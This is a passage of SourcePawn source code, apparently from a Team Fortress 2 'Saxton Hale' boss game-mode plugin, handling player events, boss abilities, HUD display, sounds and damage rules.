		PrintHintText(client,"%t","new_update");
	return Plugin_Continue;
}

public Action:event_player_spawn(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));	
	if (client<=0)
		return Plugin_Continue;
	
	SDKHook(client, SDKHook_OnTakeDamage, TakeDamageHook);
	
	if ((client==Hale) && (RoundState<2))
		CreateTimer(0.1, MakeHale);
	else
		CreateTimer(0.1, MakeNoHale, GetClientUserId(client));
		
	if (!bHelped[client])
	{
		HelpPanel(client,0);
		bHelped[client]=true;
	}
	return Plugin_Continue;
}

public Action:ClientTimer(Handle:hTimer)
{
	decl TFCond:cond;
	if (RoundState>1)
		KillTimer(hTimer);
	for(new client=1;client<=MaxClients;client++)
	if(IsClientInGame(client) && (client!=Hale) && IsPlayerAlive(client) && (GetClientTeam(client)==Team))
	{	
		if (RedAlivePlayers==1)
		{
			TF2_AddCondition(client,TFCond_Kritzkrieged,0.3);
			TF2_AddCondition(client,TFCond_Buffed,0.3);
		}
		cond=TFCond_Kritzkrieged;
		for(new i=1;i<=MaxClients;i++)
			if((RedAlivePlayers==2) || (IsClientInGame(i) && IsPlayerAlive(i) && (GetHealingTarget(i)==client)))
			{
				cond=TFCond_Buffed;
				break;
			}
			
		new weapon=GetEntPropEnt(client, Prop_Data, "m_hActiveWeapon");		
		
		if 
		(
			((weapon>0) && IsValidEdict(weapon) && (weapon==GetPlayerWeaponSlot(client, 2)) && (TF2_GetPlayerClass(client)!=TFClass_Spy))
			||
			(TF2_GetPlayerClass(client)==TFClass_Sniper) 
			||
			((TF2_GetPlayerClass(client)==TFClass_Medic) && (weapon>0) && IsValidEdict(weapon) && (GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex")==305))
		)
			TF2_AddCondition(client,cond,0.3);
			
		if ((TF2_GetPlayerClass(client)==TFClass_Medic) && (weapon==GetPlayerWeaponSlot(client, 0)))
		{
			new medigun=GetPlayerWeaponSlot(client, 1);
			if (IsValidEdict(medigun))
			{
				SetHudTextParams(-1.0, 0.83, 0.15, 255, 255, 255, 255,0,0.2,0.0,0.1);
				ShowHudText(client, -1,"%t: %i","uber-charge",RoundFloat(GetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel")*100));
			}
		}
	}
	return Plugin_Continue;
}

public Action:HaleTimer(Handle:hTimer)
{
	if (RoundState==2)
		KillTimer(hTimer);
		
	if (!IsValidEdict(Hale) || !IsClientInGame(Hale))
		return Plugin_Continue;
	if (TF2_HasCond(Hale,TF_CONDFLAG_JARATED))
		TF2_RemoveCondition(Hale,TFCond_Jarated);	
	new Float:speed=HaleSpeed+0.7*(100-HaleHealth*100/HaleHealthMax);
	SetEntPropFloat(Hale, Prop_Data, "m_flMaxspeed", speed); 
	SetEntProp(Hale, Prop_Data, "m_iHealth",HaleHealth);
	ChangeEdictState(Hale, GetEntSendPropOffs(Hale, "m_iHealth"));

	SetHudTextParams(-1.0, 0.77, 0.15, 255, 255, 255, 255);
	ShowHudText(Hale, -1, "%t","health",HaleHealth,HaleHealthMax);
	if (HaleRage/RageDMG==1)
	{
		SetHudTextParams(-1.0, 0.83, 0.15, 255, 64, 64, 255);
		ShowHudText(Hale, -1,"%t","do_rage");
	}
	else
	{
		SetHudTextParams(-1.0, 0.83, 0.15, 255, 255, 255, 255);
		ShowHudText(Hale, -1,"%t","rage_meter",HaleRage*100/RageDMG);
	}
	SetHudTextParams(-1.0, 0.88, 0.15, 255, 255, 255, 255);
	
	if (bEnableSuperDuperJump)
	{
		if (HaleCharge<=0)
		{
			HaleCharge=0;
			ShowHudText(Hale, -1,"%t","super_duper_jump");
		}
		SetHudTextParams(-1.0, 0.88, 0.15, 255, 64, 64, 255);
	}
	
	if (GetEntPropEnt(Hale, Prop_Send, "m_hActiveWeapon")==GetPlayerWeaponSlot(Hale, 0))
		TF2_AddCondition(Hale,TFCond_Kritzkrieged,0.3);
	
	new buttons=GetClientButtons(Hale);
	if ((buttons & IN_DUCK) && (HaleCharge>=0) && !(buttons & IN_JUMP))
	{
		if (Special==2)
		{
			if (HaleCharge+5<50)
				HaleCharge+=5;
			else
				HaleCharge=50;
			ShowHudText(Hale, -1, "%t","teleport_status",HaleCharge*2);
		}
		else
		{
			if (HaleCharge+5<25)
				HaleCharge+=5;
			else
				HaleCharge=25;
			ShowHudText(Hale, -1, "%t","jump_status",HaleCharge*4);
		}
	}
	else if (HaleCharge<0)
	{
		HaleCharge+=5;
		if (Special==2)
			ShowHudText(Hale, -1, "%t %i","teleport_status_2",-HaleCharge/20);
		else
			ShowHudText(Hale, -1, "%t %i","jump_status_2",-HaleCharge/20);
	}
	else
	{
		decl Float:ang[3];
		GetClientEyeAngles(Hale, ang);
		if (((ang[0]<-45.0)) && (HaleCharge>1))
		{
			decl Float:pos[3];
			if ((Special==2) && ((HaleCharge==50) || bEnableSuperDuperJump))
			{
				decl target;
				if (bEnableSuperDuperJump)
					bEnableSuperDuperJump=false;
				do
				{
					target=GetRandomInt(1,MaxClients);
				}
				while ((RedAlivePlayers>0) && (!IsValidEdict(target) || (target==Hale) || !IsPlayerAlive(target)));
				
				GetEntPropVector(target, Prop_Data, "m_vecOrigin", pos);
				TeleportEntity(Hale, pos, NULL_VECTOR, NULL_VECTOR);
				CreateTimer(3.0, RemoveEnt, EntIndexToEntRef(AttachParticle(Hale,"ghost_appearation")));		
				TF2_StunPlayer(Hale, 2.0, 0.0, TF_STUNFLAGS_GHOSTSCARE|TF_STUNFLAG_NOSOUNDOREFFECT, target);
				HaleCharge=-1100;
			}
			else if (Special!=2)
			{
				decl Float:vel[3];
				GetEntPropVector(Hale, Prop_Data, "m_vecVelocity", vel);
				if (bEnableSuperDuperJump)
				{
					vel[2]=750+HaleCharge*13.0+2000;
					bEnableSuperDuperJump=false;
				}
				else
					vel[2]=750+HaleCharge*13.0;
				vel[0]*=2*Cosine(Float:HaleCharge);
				vel[1]*=2*Cosine(Float:HaleCharge);
				TeleportEntity(Hale, NULL_VECTOR, NULL_VECTOR, vel);
				HaleCharge=-120;
				if (!Special || (Special==1))
				{
					decl String:s[256];
					GetEntPropVector(Hale, Prop_Send, "m_vecOrigin", pos);
					if (!Special)
						Format(s,256,"../%s%i.mdl",HaleJump,GetRandomInt(1,2));
					else
						Format(s,256,"../%s%i.mdl",VagineerJump,GetRandomInt(1,2));					
					EmitSoundToAll(s, Hale, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, true, 0.0);
					EmitSoundToAll(s, Hale, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, true, 0.0);
					for (new i=1; i<=MaxClients; i++)
						if (IsClientInGame(i) && (i!=Hale))
						{
							EmitSoundToClient(i,s, Hale, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, true, 0.0);
							EmitSoundToClient(i,s, Hale, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, true, 0.0);
						}
				}
			}
		}
		else
			HaleCharge=0;
	}
	
	if (RedAlivePlayers==1)
	{
		if (Special==1)
			PrintCenterTextAll("%t","vagineer_hp",HaleHealth,HaleHealthMax);	
		else if (Special==2)
			PrintCenterTextAll("%t","hhh_hp",HaleHealth,HaleHealthMax);	
		else
			PrintCenterTextAll("%t","hale_hp",HaleHealth,HaleHealthMax);	
	}

	HPTime-=0.2;
	if (HPTime<0)
		HPTime=0.0;
	if (KSpreeTimer>0) 
	KSpreeTimer-=0.2;
	return Plugin_Continue;
}

public Action:DoTaunt(client, const String:command[], argc)
{
	if (!Enabled || (client!=Hale))
		return Plugin_Continue;
	decl String:s[256];
	if (HaleRage/RageDMG==1)
	{
		decl Float:pos[3];
		GetEntPropVector(client, Prop_Send, "m_vecOrigin", pos);
		if (Special==1)
		{
			if (GetRandomInt(0,1))
				Format(s,256,"../%s",VagineerRageSound);
			else
				Format(s,256,"../%s%i.mdl",VagineerRageSound2,GetRandomInt(1,2));
		}
		else if (Special==2)
			Format(s,256,"%s",HHHRage);
		else
			Format(s,256,"../%s%i.mdl",HaleRageSound,GetRandomInt(1,4));
		EmitSoundToAll(s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
		EmitSoundToAll(s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
		
		for (new i=1; i<=MaxClients; i++)
			if (IsClientInGame(i) && (i!=Hale))
			{
				EmitSoundToClient(i,s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
				EmitSoundToClient(i,s, client, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
			}
		if (Special==1)
		{
			TF2_AddCondition(Hale,TFCond_Ubercharged,10.0);
			UberRageCount=0;
			SetEntProp(Hale, Prop_Send,"m_nSkin",GetClientTeam(Hale));
			CreateTimer(0.1,UseUberRage,_,TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);	
			CreateTimer(0.6,UseRage,true);	
		}		
		else
			CreateTimer(0.6,UseRage,false);	
		HaleRage=0;
	}
	return Plugin_Continue;
}

public Action:DoSuicice(client, const String:command[], argc)
{
	if (Enabled && (client==Hale) && (RoundState<=0))
		return Plugin_Handled;	
	return Plugin_Continue;	
}

public Action:UseRage(Handle:hTimer,any:mode)
{
	decl Float:pos[3];
	decl Float:pos2[3];
	decl i;
	decl Float:distance;
	TF2_RemoveCondition(Hale, TFCond_Taunting);	
	GetEntPropVector(Hale, Prop_Send, "m_vecOrigin", pos);
	for(i=1;i<=MaxClients;i++)
	if(IsValidEdict(i) && IsClientInGame(i) && IsPlayerAlive(i) && (i!=Hale))
	{
		GetEntPropVector(i, Prop_Send, "m_vecOrigin", pos2);
		distance=GetVectorDistance(pos,pos2);
		if (!TF2_HasCond(i,TF_CONDFLAG_UBERCHARGED) && (!mode) && (distance<RageDist) || (mode) && (distance<RageDist/4))
		{
			TF2_StunPlayer(i, 5.0, 0.0, TF_STUNFLAGS_GHOSTSCARE|TF_STUNFLAG_NOSOUNDOREFFECT, Hale);
			CreateTimer(5.0, RemoveEnt, EntIndexToEntRef(AttachParticle(i,"yikes_fx",75.0)));	
		}
	}
	i=-1;
	while ((i = FindEntityByClassname(i, "obj_sentrygun")) != -1)
	{
		GetEntPropVector(i, Prop_Send, "m_vecOrigin", pos2);
		distance=GetVectorDistance(pos,pos2);		
		if ((!mode) && (distance<RageDist) || (mode) && (distance<RageDist/4))
		{
			SetEntProp(i, Prop_Send, "m_bDisabled", 1);
			AttachParticle(i,"yikes_fx",75.0);
			SetEntProp(i, Prop_Send, "m_iHealth", GetEntProp(i, Prop_Send, "m_iHealth")/2);
			ChangeEdictState(i, GetEntSendPropOffs(i, "m_iHealth"));
			CreateTimer(8.0, EnableSG, EntIndexToEntRef(i));	
		}
	}	
	return Plugin_Continue;
}

public Action:UseUberRage(Handle:hTimer,any:param)
{
	if ((Hale<=0) || !IsValidEdict(Hale))
		return Plugin_Stop;	
	if (UberRageCount==1)
		TF2_RemoveCondition(Hale,TFCond_Taunting);
	else if (UberRageCount>=100)
	{
		SetEntProp(Hale, Prop_Data, "m_takedamage", 2);
		SetEntProp(Hale, Prop_Send,"m_nSkin",GetClientTeam(Hale)-2);
		return Plugin_Stop;
	}	
	SetEntProp(Hale, Prop_Data, "m_takedamage", 0);
	UberRageCount+=1;
	return Plugin_Continue;
}

public Action:UseBowRage(Handle:hTimer,any:clientid)
{
	TF2_RemoveCondition(Hale,TFCond_Taunting);
	UberRageCount=5;
	SetEntData(Hale, FindDataMapOffs(Hale, "m_iAmmo")+4, UberRageCount);
	return Plugin_Continue;
}


public Action:event_player_death(Handle:event, const String:name[], bool:dontBroadcast)
{
	decl String:s[256];
	if (!Enabled)
		return Plugin_Continue;

	CreateTimer(0.1,CheckAlivePlayers);
		
	new client=GetClientOfUserId(GetEventInt(event, "userid"));
	if (GetClientHealth(client)>0)
		return Plugin_Continue;		
	new attacker=GetClientOfUserId(GetEventInt(event, "attacker"));
	SDKUnhook(client, SDKHook_OnTakeDamage, TakeDamageHook);
	if (client!=Hale && (RoundState==1))
		CPrintToChat(client,"{olive}%t{default}","damage",Damage[client]);
	if ((client==Hale) && ((RoundState==1) || tf_medieval))
	{
		switch (Special)
		{
			case 2:
				EmitSoundToAll("ui/halloween_boss_defeated_fx.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			case 0:
			{
				Format(s,256,"../%s%i.mdl",HaleFail,GetRandomInt(1,3));
				EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, NULL_VECTOR, NULL_VECTOR, false, 0.0);
				EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			}
			case 1:
			{
				Format(s,256,"../%s%i.mdl",VagineerFail,GetRandomInt(1,2));
				EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, NULL_VECTOR, NULL_VECTOR, false, 0.0);
				EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			}
		}
		if (HaleHealth<0)
			HaleHealth=0;
		if (tf_medieval || !bArena && (RoundState>0))
			ForceTeamWin(Team);
		return Plugin_Continue;
	}
	if ((attacker==Hale) && (RoundState==1))
	{	
		if (GetEventBool(event, "feign_death"))
		{
			new health=GetClientHealth(client);
			if (health>50)
				SetEntityHealth(client,health-50);
			else
				FakeClientCommand(client,"kill");
			SetEventString(event, "weapon", "fists");
			return Plugin_Changed;
		}
		switch (Special)
		{
			case 0:
			if (!GetRandomInt(0,2))
			{
				Format(s,256,"");
				switch (TF2_GetPlayerClass(client))
				{					
					case TFClass_Medic:	 Format(s,256,"../%s",HaleKillMedic);	
					case TFClass_Sniper:
					{
						if (GetRandomInt(0,1)) Format(s,256,"../%s",HaleKillSniper1);
						else Format(s,256,"../%s",HaleKillSniper2);
					}
					case TFClass_Spy:
					{
						if (GetRandomInt(0,1)) Format(s,256,"../%s",HaleKillSpy1);
						else Format(s,256,"../%s",HaleKillSpy2);
					}
					case TFClass_Engineer:
					{
						if (GetRandomInt(0,1)) Format(s,256,"../%s",HaleKillEngie1);
						else Format(s,256,"../%s",HaleKillEngie2);
					}
				}
				if (!StrEqual(s,""))
				{
					EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);				
					EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);				
				}
			}
			case 1:
			{
				Format(s,256,"../%s",VagineerHit);
				EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
				EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			}
			case 2:
			{
				Format(s,256,"%s0%i.wav",HHHAttack,GetRandomInt(1,4));
				EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
				EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, attacker, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			}
		}	
		if (!bArena && !IsFakeClient(client))
			ChangeClientTeam(client, 1);
		if (KSpreeTimer>0)
			KSpreeCount++;
		else
			KSpreeCount=1;
		if (KSpreeCount==3) 
		{
			switch (Special)
			{
				case 0:
				{
					if (GetRandomInt(0,4)==1)
						Format(s,256,"../%s",HaleKSpree);
					else if (GetRandomInt(0,3)==1)
						Format(s,256,"../%s",HaleKSpree2);
					else
						Format(s,256,"../%s%i.mdl",HaleKSpreeNew,GetRandomInt(1,5));
				}
				case 1:
				{
					if (GetRandomInt(0,4)==1)
						Format(s,256,"../%s",VagineerKSpree);
					else if (GetRandomInt(0,3)==1)
						Format(s,256,"../%s",VagineerKSpree2);
					else
						Format(s,256,"../%s%i.mdl",VagineerKSpreeNew,GetRandomInt(1,5));
				}
				case 2: Format(s,256,"%s0%i.wav",HHHLaught,GetRandomInt(1,4));
			}
			EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale,NULL_VECTOR, NULL_VECTOR, false, 0.0);
			EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, NULL_VECTOR, NULL_VECTOR, false, 0.0);
			KSpreeCount=0;
		}
		else
			KSpreeTimer=5.0;
	}
	if ((TF2_GetPlayerClass(client) == TFClass_Engineer) && !GetEventBool(event, "feign_death"))
	{
		for (new ent=MaxClients+1;ent<ME;ent++)
		if (IsValidEdict(ent))
		{
			GetEdictClassname(ent, s, sizeof(s));
			if (!StrContains(s,"obj_sentrygun") && (GetEntPropEnt(ent, Prop_Send, "m_hBuilder")==client))
			{
				SetVariantInt(GetEntProp(ent, Prop_Send, "m_iMaxHealth")+1);
				AcceptEntityInput(ent, "RemoveHealth");
					
				AcceptEntityInput(ent, "kill");
			}
		}
	}	
	SetEventString(event, "weapon", "fists");
	return Plugin_Changed;
}

public Action:CheckAlivePlayers(Handle:hTimer)
{
	if (RoundState==2)
		return Plugin_Continue;
	RedAlivePlayers=0;
	new i=-1;
	while ((i=FindEntityByClassname(i, "player"))!=-1)
		if(IsClientInGame(i) && IsPlayerAlive(i) && (GetClientTeam(i)==Team))
			RedAlivePlayers++;
	
	if (RedAlivePlayers==0)
		ForceTeamWin(HaleTeam);
	else if (RedAlivePlayers==1)
	{
		decl Float:pos[3];
		decl String:s[256];
		GetEntPropVector(Hale, Prop_Send, "m_vecOrigin", pos);
		if (Special!=2)
		{
			if (Special==1)
				Format(s,256,"../%s",VagineerLastA);
			else
			{
				if (!GetRandomInt(0,3))
					Format(s,256,"../%s",Arms);
				else if (!GetRandomInt(0,3))
					Format(s,256,"%s0%i.wav",HaleLastB,GetRandomInt(1,4));
				else
					Format(s,256,"../%s%i.mdl",HaleLastMan,GetRandomInt(1,5));
			}
			
			EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, false, 0.0);
			EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, false, 0.0);
		}
	}		
	else if (!PointType && (RedAlivePlayers==AliveToEnable))
	{
		PrintHintTextToAll("%t","point_enable",AliveToEnable);
		EmitSoundToAll("vo/announcer_am_capenabled02.wav");
		new CP = FindEntityByClassname(-1, "trigger_capture_area");
		new CPm = FindEntityByClassname(-1, "team_control_point");
		if ((CP>0) && IsValidEdict(CP))
			AcceptEntityInput(CP, "Enable");	
		if ((CPm>0) && IsValidEdict(CPm))
			AcceptEntityInput(CPm, "ShowModel");
	}
	return Plugin_Continue;
}

public Action:event_hurt(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));	
	new attacker=GetClientOfUserId(GetEventInt(event, "attacker"));	
	new damage=GetEventInt(event, "damageamount");	
	if ((client!=Hale) || !IsValidEdict(client) || !IsValidEdict(attacker) || (client<=0) || (attacker<=0) || (attacker>MaxClients))
		return Plugin_Continue;
	if (!IsClientConnected(attacker) || !IsClientConnected(client))
		return Plugin_Continue;
	new ent=-1;
	if (bool:GetEventInt(event, "crit"))
	{
		HaleHealth-=damage*2/3;
		HaleRage+=damage*2/3;
		Damage[attacker]+=damage*2/3;	
		for(new i=1;i<=MaxClients;i++)
			if(IsClientInGame(i) && IsPlayerAlive(i) && (GetHealingTarget(i)==attacker))
			{
				Damage[i]+=damage*2/3;	
				break;
			}
		if (HaleRage>RageDMG)
			HaleRage=RageDMG;
		new clients[2];
		clients[0]=client;
		clients[1]=attacker;
		EmitSoundToClient(client,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		EmitSoundToClient(client,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		EmitSoundToClient(attacker,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		EmitSoundToClient(attacker,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
		decl Float:Pos[3];
		Pos[2]+=60;
		GetEntPropVector(client, Prop_Send, "m_vecOrigin", Pos);
	}
	else if (bool:GetEventInt(event, "minicrit"))
	{	
		HaleHealth-=damage/4;
		HaleRage+=damage/4;
		Damage[attacker]+=damage/4;
		for(new i=1;i<=MaxClients;i++)
			if(IsClientInGame(i) && IsPlayerAlive(i) && (GetHealingTarget(i)==attacker))
			{
				Damage[i]+=damage/8;	
				break;
			}
		if (HaleRage>RageDMG)
			HaleRage=RageDMG;
	}
	else 
	{
		while ((ent = FindEntityByClassname(ent, "tf_wearable_demoshield")) != -1)
			if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==client)
				return Plugin_Handled;		
	}
	return Plugin_Continue;
}

public Action:TakeDamageHook(client, &attacker, &inflictor, &Float:damage, &damagetype)
{
	if (!Enabled || !IsValidEdict(attacker) || ((attacker<=0) && (client==Hale)) || TF2_HasCond(client,TF_CONDFLAG_UBERCHARGED))
		return Plugin_Continue;		
	decl Float:Pos[3];
	GetEntPropVector(attacker, Prop_Send, "m_vecOrigin", Pos);
	if ((attacker==Hale) && IsValidEdict(client) && IsClientInGame(client)  && (client>0) && (client!=Hale) && !TF2_HasCond(client,TF_CONDFLAG_BONKED) && !TF2_HasCond(client,TF_CONDFLAG_UBERCHARGED))
	{
		if (damage<110.0)
			damage*=3;
		if (TF2_GetPlayerClass(client) == TFClass_DemoMan)
		{
			new ent=-1;
			while ((ent = FindEntityByClassname(ent, "tf_wearable_demoshield")) != -1)
			{
				if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==client)
				{
					//RemoveEdict(ent);					
					AcceptEntityInput(ent, "Kill");
					new clients[2];
					clients[0]=client;
					clients[1]=attacker;
					EmitSoundToClient(client,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(client,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					EmitSoundToClient(attacker,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
					TF2_AddCondition(client,TFCond_Bonked,0.1);
					return Plugin_Continue;						
				}
			}		
		}
		else if (TF2_GetPlayerClass(client) == TFClass_Spy)
		{
			new health=GetClientHealth(client);
			if (health<=50)
				FakeClientCommand(client,"kill");
			else
				SetEntityHealth(client,health-50);
		}
		damagetype=DMG_GENERIC;
		return Plugin_Changed;
	}
	else if ((attacker!=Hale) && (client==Hale))
	{
		if (attacker<=MaxClients)
		{
			if ((TF2_GetPlayerClass(attacker)==TFClass_Spy) && (damage>1000.0))
			{
				damage=HaleHealthMax*(0.12-Stabbed/90);
				Damage[attacker]+=RoundFloat(damage);
				HaleHealth-=RoundFloat(damage);
				HaleRage+=RoundFloat(damage);
				if (HaleRage>RageDMG)
					HaleRage=RageDMG;
				damage=0.0;
				decl clients[2];
				clients[0]=client;
				clients[1]=attacker;
				EmitSoundToClient(client,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
				EmitSoundToClient(attacker,"player/spy_shield_break.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, Pos, NULL_VECTOR, false, 0.0);
				EmitSoundToClient(client,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
				EmitSoundToClient(attacker,"player/crit_received3.wav", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 0.7, 100, _, _, NULL_VECTOR, false, 0.0);
				SetEntPropEnt(attacker, Prop_Send, "m_hActiveWeapon", GetPlayerWeaponSlot(attacker, 0));
				PrintCenterText(attacker,"STABBED");	
				PrintCenterText(client,"You was Stabbed");	
				if (Stabbed<5)
					Stabbed++;
				for(new i=1;i<=MaxClients;i++)
					if(IsClientInGame(i) && IsPlayerAlive(i) && (GetHealingTarget(i)==attacker))
					{
						Damage[i]+=RoundFloat(damage/2);	
						break;
					}
				return Plugin_Changed;
			}				
			Damage[attacker]+=RoundFloat(damage);
			for(new i=1;i<=MaxClients;i++)
				if(IsClientInGame(i) && IsPlayerAlive(i) && (GetHealingTarget(i)==attacker))
				{
					Damage[i]+=RoundFloat(damage/2);	
					break;
				}
		}
		else
		{
			decl String:s[64];
			GetEdictClassname(attacker, s, sizeof(s));
			if (StrEqual(s,"trigger_hurt") && (damage>=450))
				bEnableSuperDuperJump=true;				
		}
		HaleHealth-=RoundFloat(damage);
		HaleRage+=RoundFloat(damage);
		if (HaleRage>RageDMG)
			HaleRage=RageDMG;
	}
	return Plugin_Continue;
}


stock bool:TF2_HasCond(client,i)
{
	new pcond = TF2_GetPlayerConditionFlags(client);
	return pcond >= 0 ? ((pcond & i) != 0) : false;
}  

stock FindNextHale(lHale)
{
	new tHale=lHale;
	new bool:bNewLape=false;
	new pingas=0;
	while ((!bonplay[tHale] || (tHale==lHale) || !IsClientConnected(tHale) /*|| IsFakeClient(tHale)*/) && (playing>=2) && (pingas<100))
	{
		pingas++;
		if (pingas==100)
			LogError("Breaking infinite loop, when plugin try find next Hale");
		tHale++;	
		if (tHale>MaxClients)
		{
			tHale=0;
			bNewLape=true;
		}
		if (bonplay[tHale] && IsClientConnected(tHale) && !IsFakeClient(tHale) && bNewLape)
			break;
	}	
	return tHale;
}

ForceTeamWin (team){
	new ent = FindEntityByClassname(-1, "team_control_point_master");
	if (ent == -1)
	{
		ent = CreateEntityByName("team_control_point_master");
		DispatchSpawn(ent);
		AcceptEntityInput(ent, "Enable");
	}
	SetVariantInt(team);
	AcceptEntityInput(ent, "SetWinner");
}

stock AttachParticle(ent, String:particleType[],Float:offset=0.0)
{
	new particle = CreateEntityByName("info_particle_system");
	
	decl String:tName[128];
	decl Float:pos[3];
	GetEntPropVector(ent, Prop_Send, "m_vecOrigin", pos);
	pos[2]+=offset;
	TeleportEntity(particle, pos, NULL_VECTOR, NULL_VECTOR);
	
	Format(tName, sizeof(tName), "target%i", ent);
	DispatchKeyValue(ent, "targetname", tName);
	
	DispatchKeyValue(particle, "targetname", "tf2particle");
	DispatchKeyValue(particle, "parentname", tName);
	DispatchKeyValue(particle, "effect_name", particleType);
	DispatchSpawn(particle);
	SetVariantString(tName);
	AcceptEntityInput(particle, "SetParent", particle, particle, 0);
	SetEntPropEnt(particle, Prop_Data, "m_hOwnerEntity",ent);
	ActivateEntity(particle);
	AcceptEntityInput(particle, "start");
	return particle;
}

stock SpawnWeapon(client,String:name[],index,level,qual,String:att[])
{		
	new Handle:hWeapon = TF2Items_CreateItem(OVERRIDE_CLASSNAME | OVERRIDE_ITEM_DEF | OVERRIDE_ITEM_LEVEL | OVERRIDE_ITEM_QUALITY | OVERRIDE_ATTRIBUTES);
	TF2Items_SetClassname(hWeapon, name);
	TF2Items_SetItemIndex(hWeapon, index);
	TF2Items_SetLevel(hWeapon, level);
	TF2Items_SetQuality(hWeapon, qual);
	new String:atts[32][32];
	new count = ExplodeString(att, " ; ", atts, 32, 32);
	if (count > 0)
	{
		TF2Items_SetNumAttributes(hWeapon, count/2);
		new i2 = 0;
